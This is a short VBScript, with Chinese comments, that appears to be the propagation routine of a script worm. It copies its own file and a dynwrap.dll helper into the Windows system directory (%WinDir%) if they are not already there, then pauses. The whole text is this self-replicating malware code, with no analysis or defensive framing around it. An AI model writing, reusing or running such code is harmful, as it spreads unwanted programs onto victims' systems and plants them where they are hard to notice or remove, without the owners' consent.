Call Propagate(getPropagateTragetFolder)

Function getPropagateTragetFolder() '返回繁殖的目录
	Dim objWshShell
	Set objWshShell = CreateObject("Wscript.Shell")
	getPropagateTragetFolder = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\"
	Set objWshShell = Nothing
End Function

Sub Propagate(targetPath) '复制自身到指定文件夹
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
	
	sourcePath = objFileSystem.GetFile(Wscript.ScriptFullName)
	sourceName = objFileSystem.GetFile(Wscript.ScriptFullName).Name
	If objFileSystem.FileExists(targetPath & sourceName) = False Then
		objFileSystem.CopyFile sourcePath, targetPath, False
	End If
	
	Const dllName = "dynwrap.dll"
	dllPath = Replace(sourcePath, sourceName, dllName)
	If objFileSystem.FileExists(targetPath & dllName) = False And objFileSystem.FileExists(dllPath)  Then
		objFileSystem.CopyFile dllPath, targetPath, False
	End If
	WScript.Sleep 5000
	Set objFileSystem = Nothing
End Sub